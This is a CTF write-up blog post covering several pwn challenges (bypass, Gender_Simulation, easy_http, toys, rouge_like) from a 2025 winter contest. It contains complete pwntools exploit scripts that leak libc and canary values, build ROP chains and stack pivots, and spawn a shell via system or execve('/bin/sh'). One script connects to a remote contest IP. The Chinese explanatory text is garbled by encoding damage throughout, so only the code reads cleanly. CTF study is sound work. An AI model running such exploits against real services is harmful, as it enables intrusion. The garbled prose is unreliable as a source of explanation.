---
title: 2025æ˜¥ç§‹æ¯å†¬å­£èµ› WP
date: '2025-01-17 21:26:02'
updated: '2025-04-07 21:33:52'
---
## Day1 bypass
### é‡ç‚¹ï¼šå¤åˆ¶è¶Šç•Œæº¢å‡º
é¢˜ç›®ç»™äº†ELFå’Œlibcæ–‡ä»¶

checksecçŸ¥é“amd64-littleã€æ²¡canaryå’ŒPIE

åœ¨mainå‡½æ•°é‡Œé¢å‘ç°äº†è¿™ä¸¤ä¸ªè¯­å¥ä¼šæŠŠputså‡½æ•°çš„åœ°å€æ³„éœ²å‡ºæ¥ï¼Œä½†æ˜¯æ‰§è¡Œå®Œä¹‹åmainå‡½æ•°å°±ç›´æ¥ç»“æŸäº†

![](/images/0c81431cf8517fb320c1dd98bd45df04.png)

![](/images/7e229fd7bff0be6fcab98ab9e7cbdc95.png)

mainå‡½æ•°æ²¡ä»€ä¹ˆåˆ«çš„åœ°æ–¹äº†ï¼Œåé¢è°ƒç”¨äº†sub_400978()

è¿™ä¸ªå‡½æ•°é‡Œé¢æœ‰ä¸¤æ¬¡readæ ‡å‡†è¾“å…¥ï¼Œéƒ½æ˜¯è¾“å…¥åˆ°så½“ä¸­ï¼Œä¸¤æ¬¡è¾“å…¥ä¹‹é—´æŠŠsæ¸…ç©ºè¿‡ä¸€æ¬¡

ç¬¬ä¸€æ¬¡è¾“å…¥ä¹‹åsè¢«æ‹·è´åˆ°s2çš„ä½ç½®ï¼Œç¬¬äºŒæ¬¡ä¹‹åsè¢«æ‹·è´åˆ°var_210çš„ä½ç½®

å‡½æ•°sub_400978();çš„æ ˆå¸§ï¼š

![](/images/ad346b6f111fc15d4fdd57e119344f18.png)

æ ¹æ®xswlhhhå¸ˆå‚…çš„æ€è·¯ï¼Œå®ƒæ˜¯æ ¹æ®æ˜¯å¦ä¸ºé›¶æ¥åˆ¤æ–­å­—ç¬¦ä¸²çš„ç»“å°¾çš„ï¼Œ

![](/images/fdd9bd36a9cadd71968df32a8fb6410f.png)

å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥æŠŠså’Œs2éƒ¨åˆ†çš„å­—ç¬¦ä¸²è¿ä¸€èµ·ï¼Œ

æ¥è®©åé¢æŠŠsæ‹·è´åˆ°var_210çš„æ—¶å€™æº¢å‡ºæŠŠåé¢çš„iã€æ—§rbpå’Œè¿”å›åœ°å€è¦†ç›–æ¥æ§åˆ¶æ‰§è¡Œæµ

expï¼š

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

link=remote("101.200.198.105",22740)
libc=ELF("libc.so.6")

link.send(p32(2))
link.recvuntil("Invalid\n")
puts_addr=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
# print(hex(puts_addr))

libc_base=puts_addr-libc.sym['puts']
print(hex(libc_base))

ogg=libc_base+0x4f302

link.send(p32(0))
payload1=b'KEY: '+b'a'*19+p16(0x213)+p64(0xdeadbeefdeadbeef)+p64(ogg)
link.send(payload1)

sleep(1)
payload2=b'VAL: '+b'a'*0x1fb
link.send(payload2)

link.interactive()
```

## Day1 Gender_Simulation
å®˜æ–¹ wpï¼š

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">Boyå’ŒGirlç±»éƒ½æ˜¯ç»§æ‰¿è‡ªBabyç±»ï¼Œä½†æ˜¯å¯¹genderè¿™ä¸ªè™šå‡½æ•°æ–¹æ³•çš„å®ç°ä¸åŒï¼š</font>

```cpp
class Baby {
public:
    virtual void gender() = 0;
};
 
class Boy: public Baby{
public:
    Boy() {
        cout << "A boy was born" << endl;
        strncpy(certificate, generateRandomString(16).c_str(), MAX_DATA_LEN);
    }
    virtual void gender() {
        cout << "The certificate is " << certificate << '\x00' << endl;
    }
    char certificate[MAX_DATA_LEN + 0x10];
};
 
class Girl: public Baby {
public:
    Girl() {
        cout << "A girl was born" << endl;
        certificate = [](const char* str) { puts(str); };
    }
    virtual void gender() {
        string s = "The certificate is " + generateRandomString(16) + '\x00';
        certificate(s.c_str());
    }
    void (*certificate)(const char*);
};
```

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">å…¶ä¸­Boyç±»çš„certificateçš„ç±»å‹æ˜¯charå­—ç¬¦ä¸²ï¼Œè€ŒGirlç±»ä¸­çš„certificateæ˜¯å‡½æ•°æŒ‡é’ˆã€‚</font>

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">å› æ­¤å½“é€‰æ‹©Femboyæˆ–è€…Tomboyæ—¶å°±ä¼šäº§ç”Ÿç±»å‹æ··æ·†ã€‚å…¶ä¸­å½“é€‰æ‹©Tomboyæ—¶ï¼Œç”±äºç›´æ¥æŠŠGirlç±»å‹ç›´æ¥è½¬åŒ–ä¸ºBoyç±»å‹ï¼Œå› æ­¤è¯†åˆ«åˆ°çš„certificateæ˜¯Boyç±»ä¸­çš„charå­—ç¬¦ä¸²ï¼Œè€Œåç»­å®é™…è°ƒç”¨çš„genderæ–¹æ³•æ˜¯Girlç±»çš„ï¼ˆå³ä¼šæŠŠcertificateå½“æˆå‡½æ•°æŒ‡é’ˆè°ƒç”¨ï¼‰ï¼š</font>

```cpp
static void choose(Baby* baby) {
    string s = typeid(*baby).name();
    char choice;
    if (s == "3Boy") {
        // pass it
    } else if ( s == "4Girl") {
        menu(baby);
        cin >> choice;
        switch (choice) {
            case '1': {
                // pass it
            }
            case '2': {
                string buf;
                Boy* tomboy = static_cast<Boy*>(baby);
                cout << "If you think you are a boy, please leave your gender certificate" << endl;
                cin >> buf;
                strncpy(tomboy->certificate, buf.c_str(), MAX_DATA_LEN); // æ­¤å¤„certificateä¼šè¢«è¯†åˆ«ä¸ºBoyç±»çš„char*ç±»å‹ï¼Œå› æ­¤ä¸ä¼šæŠ¥é”™
                tomboy->gender(); // è¿™é‡Œä¼šè¯†åˆ«ä¸ºGrilç±»çš„genderå®ç°æ–¹æ³•
                break;
            }
            default: {
                // pass it
            }
        }
    }
}
```

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">ä¹Ÿå°±æ˜¯æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆå¹¶è°ƒç”¨å®ƒã€‚ç¨‹åºé‡Œé¢„ç•™äº†ä¸€ä¸ªgenderæ ˆæº¢å‡ºæ¼æ´å‡½æ•°ï¼Œå¯ä»¥ä¿®æ”¹certificateä¸ºè¿™ä¸ªå‡½æ•°åœ°å€å®ç°è°ƒç”¨ï¼š</font>

```cpp
void gender() {
    char buf[MAX_DATA_LEN];
    cout << "If you think you are a shopping bag, please leave your gender certificate" << endl;
    read(0, buf, 0x100);
}
```

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">ç¨‹åºæ²¡æœ‰å¼€PIEå’ŒCanaryï¼Œä¸”å¼€å¤´ç»™å‡ºäº†libcä¸Šçš„åœ°å€ï¼Œåœ¨IDAä¸­æŸ¥çœ‹bufï¼Œå¯ä»¥è·å–éœ€è¦å¡«å……çš„åç§»é‡ï¼š</font>

```plain
-0000000000000010 // Use data definition commands to manipulate stack variables and arguments.
-0000000000000010 // Frame size: 10; Saved regs: 8; Purge: 0
-0000000000000010
-0000000000000010     _BYTE buf[16];
+0000000000000000     _QWORD __saved_registers;
+0000000000000008     _UNKNOWN *__return_address;
+0000000000000010
+0000000000000010 // end of stack variables
```

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">é«˜ç‰ˆæœ¬çš„æ ˆæº¢å‡ºropé“¾å¯»æ‰¾æ¯”è¾ƒéº»çƒ¦ï¼Œè¿™é‡Œç»™å‡ºä¸€æ¡é’ˆå¯¹æ­¤é¢˜çš„ropé“¾ï¼š</font>

```plain
# 0x000000000040391a : mov rax, qword ptr [rbp - 8] ; pop rbp ; ret
# 0x0000000000402fcc : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
# 0x000000000040201a : ret
# 0x0000000000403476 : mov rdi, rax ; call rbx
```

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">é€šè¿‡[rbp -8] -> rax -> rdiå¯ä»¥å®ç°æ§åˆ¶ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè€Œé€šè¿‡æ§åˆ¶rbxå¯ä»¥æ§åˆ¶è¦è°ƒç”¨çš„å‡½æ•°ã€‚</font>

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">æˆ‘ä»¬å°†rbxæ§åˆ¶ä¸ºsystemåœ°å€ï¼Œ[rbp-8]æ§åˆ¶ä¸º/bin/shåœ°å€å°±å¯ä»¥å®ç°è°ƒç”¨system("/bin/sh")æ–¹æ³•äº†ï¼Œè€Œè¦æ§åˆ¶[rbp-8]éœ€è¦åœ¨libcä¸Šæ‰¾åˆ°ä¸€ä¸ªè°ƒç”¨/bin/shåœ°å€çš„åœ°å€ï¼Œå†å°†old_rbpå¡«å……ä¸ºè¿™ä¸ªåœ°å€+8çš„å€¼ï¼Œæœ€åæ‰§è¡Œå®Œleaveåï¼Œrbpçš„åœ°å€å°±ä¼šå˜æˆè¿™ä¸ªåœ°å€+8çš„å€¼ã€‚</font>

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">é€šè¿‡IDAåˆ©ç”¨libc.so.6æŸ¥æ‰¾/bin/shçš„äº¤å‰å¼•ç”¨å¯ä»¥æ‰¾çš„0x201500è¿™ä¸ªåç§»ï¼š</font>

```plain
.data.rel.ro:00000000002014FC                 db    0
.data.rel.ro:00000000002014FD                 db    0
.data.rel.ro:00000000002014FE                 db    0
.data.rel.ro:00000000002014FF                 db    0
.data.rel.ro:0000000000201500 off_201500      dq offset aBinSh        ; DATA XREF: sub_110F20+C3â†‘r
.data.rel.ro:0000000000201500                                         ; sub_110F20+7B1â†‘r
.data.rel.ro:0000000000201500                                         ; "/bin/sh"
.data.rel.ro:0000000000201508                 align 20h
.data.rel.ro:0000000000201520 off_201520      dq offset off_201560    ; DATA XREF: argp_parse+406â†‘o
.data.rel.ro:0000000000201520                                         ; "version"
.data.rel.ro:0000000000201528                 dq offset sub_134960
```

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">ç¼–å†™expå³å¯è·å–flagï¼š</font>

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">å®Œæ•´çš„expï¼š</font>

```python
from pwn import *
from pwn import p64

target_info = {
    'exec_path': './pwn',
    'elf_info': ELF('./pwn'),
    'libc_info': ELF('./libc.so.6')
}

#io = process(target_info['exec_path'])
io = remote('127.0.0.1', 8888)

#gdb.attach(io, 'b *0x40262E')
#pause()

io.recvuntil(b'gift: ')

setvbuf = {
    'got' : int(io.recvline().strip(), 16)
}
log.info(f'setvbuf@got: {hex(setvbuf["got"])}')
target_info['libc_info'].address = setvbuf['got'] - target_info['libc_info'].sym['setvbuf']
log.info(f'libc_base: {hex(target_info["libc_info"].address)}')

binsh = target_info['libc_info'].address + 0x201500
system = target_info['libc_info'].sym['system']

payload = p64(target_info['elf_info'].sym['_Z6genderv'])
io.sendlineafter(b'Girl\n', b'2')
io.sendlineafter(b'Tomboy\n', b'2')
io.sendlineafter(b'certificate\n', payload)

puts = {
    'plt': target_info['elf_info'].plt['puts'],
    'got': target_info['elf_info'].got['puts']
}

payload = p64(0)*2 + p64(binsh+8) + p64(0x000000000040391a) + p64(0) + p64(0x0000000000402fcc) + p64(system) + p64(0)*3 + p64(0x000000000040201a) + p64(0x0000000000403476)
io.sendlineafter(b'certificate\n', payload)


io.interactive()

# 0x000000000040391a : mov rax, qword ptr [rbp - 8] ; pop rbp ; ret
# 0x0000000000402fcc : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
# 0x000000000040201a : ret
# 0x0000000000403476 : mov rdi, rax ; call rbx
```

## Day2 easy_http
å®˜æ–¹ wpï¼š

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">é€‰æ‰‹é¦–å…ˆéœ€è¦é€†å‘å¾—åˆ°æ•°æ®æ ¼å¼ã€‚</font>

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">é€šè¿‡éƒ¨åˆ†é€†å‘çš„æºç æˆ–è€…çŒœæµ‹ï¼Œåˆ¤æ–­å‡ºä¸»å‡½æ•°é€šè¿‡</font>`<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">fork</font>`<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">å‡½æ•°æ¥ä¸æ–­äº§ç”Ÿå­è¿›ç¨‹ï¼Œå¹¶åœ¨å­è¿›ç¨‹ä¸Šè¿›è¡Œå„ç§æ“ä½œ</font>

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">è‹¥é€‰æ‰‹æ²¡æœ‰æ³¨æ„åˆ°æ“ä½œå‘ç”Ÿåœ¨å­è¿›ç¨‹ï¼Œåˆ™å¯èƒ½è¯¯è®¤ä¸ºè€ƒå¯Ÿç‚¹åœ¨äºå †ä¸Šçš„</font>`<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">UAF</font>`<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">ï¼›è€Œå­è¿›ç¨‹ç›¸äº’éš”ç¦»ï¼Œå› æ­¤ä¸å¯èƒ½é€šè¿‡å †ä¸Šæ¥è¿›è¡Œåˆ©ç”¨ã€‚</font>

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">æ„é€ å¥½ç®€æ˜“</font>`<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">http</font>`<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">æ•°æ®åŒ…ï¼Œè¦æ±‚å¦‚ä¸‹ï¼š</font>

+ `<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">Host</font>`
+ `<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">Content</font>`
+ `<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">Content-Length</font>`

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">æ­¤å¤–ï¼Œæ¯ä¸ªå‚æ•°è¿˜å…·æœ‰ä¸åŒçš„è¦æ±‚ï¼ŒåŒ…æ‹¬æœ€å¤§å€¼ç­‰ã€‚</font>

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">è€Œæ ¡éªŒæ—¶ï¼Œé”™è¯¯ä½¿ç”¨äº†</font>`<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">&&</font>`<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">å’Œ</font>`<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">||</font>`<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">ï¼š</font>

```c
if (!valid_host && !valid_length && !valid_content)
{
    return 0;
}
```

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">å¯¼è‡´åªè¦ä¸‰ä¸ªå±æ€§ä¸­æœ‰ä¸€ä¸ªæ»¡è¶³è¦æ±‚å³å¯ã€‚</font>

<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">åˆï¼š</font>

```c
memcpy(real_content, content, length);
```

<font style="color:#000000;">å› æ­¤åˆç†æ§åˆ¶</font>`<font style="color:#000000;">content-length</font>`<font style="color:#000000;">å’Œ</font>`<font style="color:#000000;">content</font>`<font style="color:#000000;">ï¼Œæœ‰ä¸€ä¸ªå‡ ä¹æ— é™åˆ¶çš„æ ˆæº¢å‡ºã€‚</font>

<font style="color:#000000;">éšåï¼Œé€šè¿‡æ ¡éªŒåï¼Œæœ‰å¦‚ä¸‹å‡ ä¸ªè·¯ç”±ï¼Œä»£è¡¨å‡ ä¸ªä¸åŒçš„åŠŸèƒ½ï¼š</font>

+ `<font style="color:#000000;">show</font>`
+ `<font style="color:#000000;">add</font>`
+ `<font style="color:#000000;">delete</font>`
+ `<font style="color:#000000;">edit</font>`

<font style="color:#000000;">é‡Œé¢å­˜åœ¨</font>`<font style="color:#000000;">UAF</font>`<font style="color:#000000;">ï¼Œä½†æ— æ³•åˆ©ç”¨ã€‚</font>

<font style="color:#000000;">é€‰æ‰‹éœ€è¦æ’é™¤å¹²æ‰°ï¼Œé€šè¿‡å¤šæ¬¡æ ˆæº¢å‡ºæ¥è·å¾—</font>`<font style="color:#000000;">shell</font>`<font style="color:#000000;">ã€‚</font>

<font style="color:#000000;">å› æ­¤ï¼Œæ„é€ ä¸¤ä¸ªæ•°æ®åŒ…ï¼Œç¬¬ä¸€ä¸ªæ³„éœ²</font>`<font style="color:#000000;">canary</font>`<font style="color:#000000;">ï¼Œç¬¬äºŒä¸ª</font>`<font style="color:#000000;">rop</font>`<font style="color:#000000;">æ‹¿ä¸‹</font>`<font style="color:#000000;">shell</font>`<font style="color:#000000;">ã€‚</font>

```python
from pwn import *

filename = './pwn'
context.arch='amd64'
context.log_level = "debug"
context.terminal = ['tmux', 'neww']
local = 0
all_logs = []
elf = ELF(filename)
libc = elf.libc

if local:
    sh = process(filename)
else:
    sh = remote('localhost', 9999)

def debug(params=''):
    for an_log in all_logs:
        success(an_log)
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid+2, params)
    pause()

def leak_info(name, addr):
    output_log = '{} => {}'.format(name, hex(addr))
    all_logs.append(output_log)
    success(output_log)

# debug("")

template = '''POST /{} HTTP/1.1\r
Host: www.baidu.com\r
User-Agent: Haha\r
Content-Length: {}\r
Content: {}\r
'''
payload = template.format("show", 0x109, 'a'*0x109)
sh.send(payload)

sh.recvuntil(b'a'*0x109)
canary = u64(sh.recv(7).rjust(8, b'\x00'))
leak_info('canary', canary)

pop_5 = 0x40a9d7
pop_rdi = 0x40296f
pop_rsi = 0x40a9de
pop_rdx_2 = 0x4a4c4b
pop_rax = 0x459227
syscall = 0x422fe6
pop_rsp = 0x402dce
leave_ret = 0x401b01
ret = 0x40101a
bss = 0x4E8700

chain = b'a'*0x108 + p64(canary) + p64(0xdeadbeaf)
chain += p64(pop_5) + (b'a'*0x15 + b'/add\x00').ljust(0x28, b'a')
chain += p64(pop_rdi) + p64(0)
chain += p64(pop_rsi) + p64(bss)
chain += p64(pop_rdx_2) + p64(0x100)*2
chain += p64(pop_rax) + p64(0)
chain += p64(syscall)
chain += p64(pop_rax) + p64(59)
chain += p64(pop_rdi) + p64(bss)
chain += p64(pop_rsi) + p64(0)
chain += p64(pop_rdx_2) + p64(0)*2
chain += p64(syscall)

template = '''POST /{} HTTP/1.1\r
Host: www.baidu.com\r
User-Agent: Haha\r
Content-Length: {}\r
Content: '''

chain = chain
payload = template.format("add", len(chain)).encode('utf-8')
payload += chain + b'\r\n'

sh.send(payload)

sh.send('/bin/sh\x00')

sh.interactive()
```

## Day3 toys
å®˜æ–¹ wpï¼š

1. é¢˜ç›®å°±æ˜¯å¾ˆç®€å•çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯å‘ç”Ÿåœ¨é«˜ç‰ˆæœ¬libcä¸­å¯¼è‡´æ²¡æœ‰è¶³å¤Ÿçš„gadgetè¿›è¡Œä½¿ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦è¿›è¡Œæ ˆè¿ç§»ã€‚å¹¶ä¸”é¢˜ç›®ä¸­æ²¡æœ‰è¾“å‡ºå‡½æ•°æ¥è¾“å‡ºæˆ‘ä»¬è¾“å…¥çš„å†…å®¹å¯¼è‡´éš¾ä»¥æ³„æ¼åœ°å€
2. ä½†æ˜¯å¾ˆå®¹æ˜“å¯ä»¥æ³¨æ„åˆ°è¿™é‡Œçš„strlenå‡½æ•°å°±éå¸¸ç±»ä¼¼putså‡½æ•°æ¥ä½¿ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œå¦‚æœå¯ä»¥å°†strlenå‡½æ•°çš„gotè¡¨ä¸­çš„å†…å®¹ä¿®æ”¹ä¸ºputsçš„pltè¡¨ä»è€Œå¯ä»¥å®ç°æ³„æ¼å‡ºå…¶ä¸­çš„å†…å®¹
3. ä½†æ˜¯å®é™…æ“ä½œä¼šå‘ç°å¦‚æœç›´æ¥è¿›è¡Œæ ˆè¿ç§»åˆ°è¯¥gotè¡¨ä½ç½®ä¼šå¯¼è‡´å…¶ä»–çš„å†…å®¹è¢«æ¯æ‰€ä»¥è¿™é‡Œè¿˜éœ€è¦å°†rspç»™è¿ç§»åˆ°æ›´é«˜çš„åœ°å€ï¼Œä»è€Œé¿å…è¯¥å†…å­˜ä¸­çš„é‡è¦å†…å®¹ä¸è¢«ä¿®æ”¹
4. æ‰€ä»¥è¿™é‡Œéœ€è¦è¿›è¡Œå‡ æ¬¡è¿ç§»ï¼Œé€šè¿‡å¤šæ¬¡leave retæ¥ä¿è¯æˆ‘ä»¬åœ¨æ‰§è¡Œå‡½æ•°æ—¶rspéƒ½å¤„äºé«˜åœ°å€

æœ€ç»ˆå¯å¾—exp

```python
from pwn import *

elf = ELF('./pwn')
# r = process('./pwn')
r = remote('172.16.0.2', 9999)
libc = ELF('./libc.so.6')

context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'

leave_ret  = 0x00000000004012cd
fget_read  = 0x00401274
puts_plt   = 0x00401090
puts_addr  = 0x40128C
got_addr   = 0x00404000
strlen_got = 0x00404008

r.recvuntil(b'Data: ')
payload = flat(b'\x00'*0x80, got_addr + 0x800, fget_read)
r.sendline(payload)

r.recvuntil(b'OK')
payload = flat(b'\x00'*0x80, got_addr + 0x100, fget_read,
               strlen_got + 0x80, fget_read, strlen_got + 0x98, puts_addr, strlen_got + 0x700, fget_read)
r.sendline(payload)

# gdb.attach(r, 'b*0x004012cd')

r.recvuntil(b'OK')
payload = flat([0], got_addr + 0x820, leave_ret,[0], got_addr + 0x830, leave_ret)
payload = payload.ljust(0x80, b'\x00') + flat(got_addr + 0x810, leave_ret)
r.sendline(payload)

r.recvuntil(b'OK')
payload = flat(puts_plt)
r.sendline(payload)

# gdb.attach(r, 'b*0x004012cd')

r.recvuntil(b'OK!\n')
libc_base = u64(r.recv(6).ljust(8, b'\x00')) - 0x88540
print(hex(libc_base))

system_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi = libc_base + next(libc.search(asm("pop rdi; ret")))

r.recvuntil(b'OK!\n')
payload = flat(b'\x00' * 0x88, pop_rdi, bin_sh_addr, system_addr)
r.sendline(payload)

r.interactive()
```

## Day3 rouge_like
<font style="background-color:rgba(255, 255, 255, 0);">å®˜æ–¹ wpï¼š</font>

<font style="background-color:rgba(255, 255, 255, 0);">é¢˜ç›®éå¸¸æ–°é¢–ï¼Œä¸€å…±è®¾ç½®äº†ä¸‰ä¸ªå…³å¡ã€‚</font>

<font style="background-color:rgba(255, 255, 255, 0);">å¯¹äºç¬¬ä¸€å…³ï¼Œé€‰æ‰‹å¯ä»¥é€‰æ‹©å¦‚ä¸‹æ¼æ´åˆ©ç”¨ï¼š</font>

+ <font style="background-color:rgba(255, 255, 255, 0);">æŒ‡å®š</font>`<font style="background-color:rgba(255, 255, 255, 0);">libc</font>`<font style="background-color:rgba(255, 255, 255, 0);">åœ°å€å†™</font>`<font style="background-color:rgba(255, 255, 255, 0);">8</font>`<font style="background-color:rgba(255, 255, 255, 0);">å­—èŠ‚</font>`<font style="background-color:rgba(255, 255, 255, 0);">0</font>`
+ <font style="background-color:rgba(255, 255, 255, 0);">æŒ‡å®š</font>`<font style="background-color:rgba(255, 255, 255, 0);">libc</font>`<font style="background-color:rgba(255, 255, 255, 0);">åœ°å€å†™</font>`<font style="background-color:rgba(255, 255, 255, 0);">1</font>`<font style="background-color:rgba(255, 255, 255, 0);">å­—èŠ‚ä»»æ„å€¼</font>
+ <font style="background-color:rgba(255, 255, 255, 0);">æŸ¥çœ‹</font>`<font style="background-color:rgba(255, 255, 255, 0);">/proc/self/maps</font>`<font style="background-color:rgba(255, 255, 255, 0);">ï¼Œè·å¾—å¤§éƒ¨åˆ†åœ°å€</font>

<font style="background-color:rgba(255, 255, 255, 0);">å¯¹äºç¬¬äºŒå…³ï¼Œé€‰æ‰‹å¯ä»¥é€‰æ‹©å¦‚ä¸‹æ¼æ´åˆ©ç”¨ï¼š</font>

+ <font style="background-color:rgba(255, 255, 255, 0);">å¢åŠ æŒ‡å®šåœ°å€ä¸Šçš„å€¼ï¼Œæœ€å¤šä¸º</font>`<font style="background-color:rgba(255, 255, 255, 0);">5</font>`
+ <font style="background-color:rgba(255, 255, 255, 0);">å¢åŠ æŒ‡å®šåœ°å€ä¸ŠæŒ‡å‘çš„å€¼ï¼Œæœ€å¤šä¸º</font>`<font style="background-color:rgba(255, 255, 255, 0);">5</font>`
+ <font style="background-color:rgba(255, 255, 255, 0);">æ— ç”¨åŠŸèƒ½</font>

<font style="background-color:rgba(255, 255, 255, 0);">å¯¹äºç¬¬ä¸‰å…³ï¼Œé€‰æ‰‹å¯ä»¥é€‰æ‹©å¦‚ä¸‹æ¼æ´åˆ©ç”¨ï¼š</font>

+ <font style="background-color:rgba(255, 255, 255, 0);">æ ˆæº¢å‡º</font>`<font style="background-color:rgba(255, 255, 255, 0);">0x20</font>`<font style="background-color:rgba(255, 255, 255, 0);">å­—èŠ‚ï¼Œä½†åŒæ—¶ä¼š</font>`<font style="background-color:rgba(255, 255, 255, 0);">close(0)</font>`
+ <font style="background-color:rgba(255, 255, 255, 0);">é€šè¿‡</font>`<font style="background-color:rgba(255, 255, 255, 0);">write</font>`<font style="background-color:rgba(255, 255, 255, 0);">è¾“å‡ºæ ˆä¸Šå¤§é‡å†…å®¹ï¼Œä½†ä¸å­˜åœ¨æ ˆæº¢å‡º</font>
+ <font style="background-color:rgba(255, 255, 255, 0);">æ ˆæº¢å‡º</font>`<font style="background-color:rgba(255, 255, 255, 0);">rbp</font>`<font style="background-color:rgba(255, 255, 255, 0);">ä¸€å­—èŠ‚ä¸º</font>`<font style="background-color:rgba(255, 255, 255, 0);">0</font>`<font style="background-color:rgba(255, 255, 255, 0);">ï¼Œä½†èƒ½å¤Ÿ</font>`<font style="background-color:rgba(255, 255, 255, 0);">read</font>`<font style="background-color:rgba(255, 255, 255, 0);">ä¸¤æ¬¡</font>

<font style="background-color:rgba(255, 255, 255, 0);">åœ¨ç¬¬ä¸‰å…³å¼€å§‹æ—¶ï¼Œç¨‹åºè¿˜ä¼š</font>`<font style="background-color:rgba(255, 255, 255, 0);">close(1)</font>`<font style="background-color:rgba(255, 255, 255, 0);">ï¼Œé˜²æ­¢è¾“å‡ºä»»ä½•å†…å®¹ã€‚</font>

<font style="background-color:rgba(255, 255, 255, 0);">å…ˆè¯´é¢„æœŸè§£ï¼š</font>

+ <font style="background-color:rgba(255, 255, 255, 0);">é€šè¿‡ç¬¬ä¸€å…³é€‰æ‹©åç§»å°†</font>`<font style="background-color:rgba(255, 255, 255, 0);">tls</font>`<font style="background-color:rgba(255, 255, 255, 0);">ä¸­çš„</font>`<font style="background-color:rgba(255, 255, 255, 0);">canary</font>`<font style="background-color:rgba(255, 255, 255, 0);">ç½®é›¶</font>
+ <font style="background-color:rgba(255, 255, 255, 0);">é€šè¿‡ç¬¬äºŒå…³é€‰æ‹©æŒ‡å®šåœ°å€</font>`<font style="background-color:rgba(255, 255, 255, 0);">+5</font>`<font style="background-color:rgba(255, 255, 255, 0);">ï¼Œè¿™é‡Œé€‰æ‹©å°†</font>`<font style="background-color:rgba(255, 255, 255, 0);">alarm</font>`<font style="background-color:rgba(255, 255, 255, 0);">åç§»è·å¾—</font>`<font style="background-color:rgba(255, 255, 255, 0);">syscall</font>`
+ <font style="background-color:rgba(255, 255, 255, 0);">é€šè¿‡ç¬¬ä¸‰å…³é€‰æ‹©æ ˆä¸Šçš„</font>`<font style="background-color:rgba(255, 255, 255, 0);">off-by-null</font>`<font style="background-color:rgba(255, 255, 255, 0);">è¿›è¡Œåˆ©ç”¨ï¼Œä»è€Œ</font>`<font style="background-color:rgba(255, 255, 255, 0);">rop</font>`<font style="background-color:rgba(255, 255, 255, 0);">è·å¾—</font>`<font style="background-color:rgba(255, 255, 255, 0);">shell</font>`

<font style="background-color:rgba(255, 255, 255, 0);">æ³¨æ„ï¼Œé¢˜ç›®æœ‰å¤šå¤„å¯ä»¥</font>`<font style="background-color:rgba(255, 255, 255, 0);">leak</font>`<font style="background-color:rgba(255, 255, 255, 0);">çš„æ‰“æ³•ï¼Œä½†æœ¬é¢˜ç”±äºéœ€è¦è¿›è¡Œæ¼æ´çš„ç»„åˆåˆ©ç”¨ï¼Œé€‰æ‹©</font>`<font style="background-color:rgba(255, 255, 255, 0);">leak</font>`<font style="background-color:rgba(255, 255, 255, 0);">åï¼Œåˆ™æ— æ³•ç»„åˆå‡ºå¯ä»¥è·å¾—</font>`<font style="background-color:rgba(255, 255, 255, 0);">shell</font>`<font style="background-color:rgba(255, 255, 255, 0);">çš„åˆ©ç”¨é“¾ã€‚</font>

<font style="background-color:rgba(255, 255, 255, 0);">ä¾‹å¦‚ï¼Œç¬¬ä¸€å…³å¯ä»¥é€‰æ‹©æŸ¥çœ‹</font>`<font style="background-color:rgba(255, 255, 255, 0);">/proc/self/maps</font>`<font style="background-color:rgba(255, 255, 255, 0);">ï¼Œä½†å¦‚æ­¤ä¾¿æ— æ³•è¦†ç›–</font>`<font style="background-color:rgba(255, 255, 255, 0);">canary</font>`<font style="background-color:rgba(255, 255, 255, 0);">ä¸º</font>`<font style="background-color:rgba(255, 255, 255, 0);">0</font>`<font style="background-color:rgba(255, 255, 255, 0);">ï¼Œæ— æ³•é€šè¿‡æ ˆæº¢å‡ºåˆ©ç”¨ã€‚</font>

<font style="background-color:rgba(255, 255, 255, 0);">åˆä¾‹å¦‚ï¼Œç¬¬ä¸‰å…³è¾“å‡ºå†…å®¹æ—¶ä¼šå› ä¸º</font>`<font style="background-color:rgba(255, 255, 255, 0);">close(1)</font>`<font style="background-color:rgba(255, 255, 255, 0);">çš„ç¼˜æ•…ï¼Œæ— æ³•è·å¾—å†…å®¹ã€‚</font>

